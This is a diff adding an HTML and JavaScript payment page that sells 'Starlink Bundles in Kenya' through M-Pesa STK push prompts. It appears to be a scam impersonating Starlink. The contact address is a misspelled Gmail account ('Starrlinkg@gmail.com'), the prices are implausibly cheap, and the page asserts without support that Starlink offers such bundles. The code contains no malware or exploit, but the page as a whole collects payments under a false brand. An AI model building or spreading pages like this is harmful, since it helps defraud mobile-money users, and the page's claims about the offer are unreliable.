@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Payment</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            text-align: center;
+            padding: 50px;
+        }
+        h2 {
+            color: #33710dd1;
+        }
+        .container {
+            background: white;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+            display: inline-block;
+        }
+        .button {
+            display: block;
+            width: 100%;
+            margin: 10px 0;
+            padding: 12px;
+            font-size: 16px;
+            font-weight: bold;
+            color: white;
+            background: #28a745;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+        .button:hover {
+            background: #218838;
+        }
+        .read-more {
+            color: blue;
+            cursor: pointer;
+            text-decoration: underline;
+        }
+        .description {
+            display: none;
+            text-align: left;
+            margin-top: 10px;
+        }
+        .footer {
+            margin-top: 20px;
+            font-size: 14px;
+            color: #666;
+        }
+        #payment-status {
+            display: none;
+            text-align: left;
+            margin-top: 20px;
+        }
+        #success-tick {
+            color: green;
+            font-size: 24px;
+            display: inline-block;
+        }
+        #status-message {
+            font-weight: bold;
+            margin-top: 10px;
+        }
+        #instruction-message {
+            margin-top: 10px;
+        }
+        #ok-button {
+            background-color: #007bff;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            font-size: 16px;
+            cursor: pointer;
+            border-radius: 5px;
+            margin-top: 20px;
+        }
+        #ok-button:hover {
+            background-color: #0056b3;
+        }
+    </style>
+    <script>
+        function initiateMpesaPayment(amount) {
+            let phone = prompt("Enter your Safaricom phone number:");
+
+            if (!phone || phone.length < 10) {
+                alert("Invalid phone number. Please try again.");
+                return;
+            }
+
+            fetch('/mpesa/stk_push/', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'X-CSRFToken': getCSRFToken()
+                },
+                body: JSON.stringify({ phone_number: phone, amount: amount })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.status === "success") {
+                    // Show success message with tick and instructions
+                    document.getElementById("payment-status").style.display = "block";
+                    document.getElementById("success-tick").style.display = "inline-block";
+                    document.getElementById("status-message").innerText = "Success!";
+                    document.getElementById("instruction-message").innerText = "We have sent an STK push to your phone (" + phone + "). Please enter your PIN to complete the bundles purchase.";
+                    document.getElementById("ok-button").style.display = "inline-block"; // Show the OK button
+                } else {
+                    alert("❌ Failed: " + data.message);
+                }
+            })
+            .catch(error => {
+                alert("⚠ An error occurred: " + error);
+            });
+        }
+
+        function getCSRFToken() {
+            let cookieValue = null;
+            let cookies = document.cookie.split(';');
+            for (let i = 0; i < cookies.length; i++) {
+                let cookie = cookies[i].trim();
+                if (cookie.startsWith('csrftoken=')) {
+                    cookieValue = cookie.substring('csrftoken='.length, cookie.length);
+                    break;
+                }
+            }
+            return cookieValue;
+        }
+
+        function toggleDescription() {
+            let description = document.getElementById("description");
+            let readMore = document.getElementById("readMore");
+            if (description.style.display === "none") {
+                description.style.display = "block";
+                readMore.innerText = "Read Less";
+            } else {
+                description.style.display = "none";
+                readMore.innerText = "Read More";
+            }
+        }
+
+        function closeMessage() {
+            document.getElementById("payment-status").style.display = "none";
+            document.getElementById("ok-button").style.display = "none"; // Hide the OK button
+        }
+    </script>
+</head>
+<body>
+    <div class="container">
+        <h2>Select Payment Plan</h2>
+        <button class="button" onclick="initiateMpesaPayment(85)">7 Days - 10GB (Ksh 85)</button>
+        <button class="button" onclick="initiateMpesaPayment(155)">21 Days - 30GB (Ksh155)</button>
+        <button class="button" onclick="initiateMpesaPayment(225)">31 Days - Unlimited (Ksh225)</button>
+
+        <p class="read-more" id="readMore" onclick="toggleDescription()">Read More</p>
+        <div class="description" id="description">
+            <p><strong>Starlink Bundles in Kenya:</strong> Starlink has recently introduced affordable high-speed internet options in Kenya, providing reliable satellite-based internet for both urban and rural areas. These bundles allow users to enjoy seamless connectivity for work, entertainment, and business.</p>
+        </div>
+
+        <!-- Payment status section -->
+        <div id="payment-status">
+            <span id="success-tick">✔</span>
+            <p id="status-message"></p>
+            <p id="instruction-message"></p>
+            <button id="ok-button" onclick="closeMessage()">OK</button>
+        </div>
+    </div>
+
+    <div class="footer">
+        <p>Contact us at: <a href="mailto:Starrlinkg@gmail.com">Starrlinkhelp</a></p>
+    </div>
+</body>
+</html>
